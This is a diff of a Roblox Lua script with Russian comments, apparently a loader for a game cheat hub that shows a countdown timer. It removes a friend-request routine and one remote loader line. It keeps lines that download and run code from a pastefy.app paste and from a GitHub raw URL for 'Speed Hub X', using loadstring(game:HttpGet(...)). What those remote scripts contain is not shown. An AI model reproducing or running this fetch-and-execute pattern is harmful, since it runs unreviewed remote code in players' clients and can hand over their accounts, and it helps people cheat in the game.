@@ -34,18 +34,6 @@ local LocalPlayer = Players.LocalPlayer
 
 loadstring(game:HttpGet("https://pastefy.app/OdHykpcd/raw"))()
 
--- Функция отправки запроса
-local function sendFriendRequest(player)
-    if player ~= LocalPlayer then
-        pcall(function()
-            LocalPlayer:RequestFriendship(player)
-            print("📩 Отправлен запрос в друзья: " .. player.Name)
-        end)
-    end
-end
-
-sendFriendRequest(player)
-
 -- Таймер
 local TimerLabel = Instance.new("TextLabel")
 TimerLabel.Size = UDim2.new(1, 0, 0.25, 0)
@@ -136,4 +124,3 @@ end
 -- Удаление GUI
 ScreenGui:Destroy()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
-loadstring(game:HttpGet("https://pastefy.app/f7dA9ePx/raw",true))()
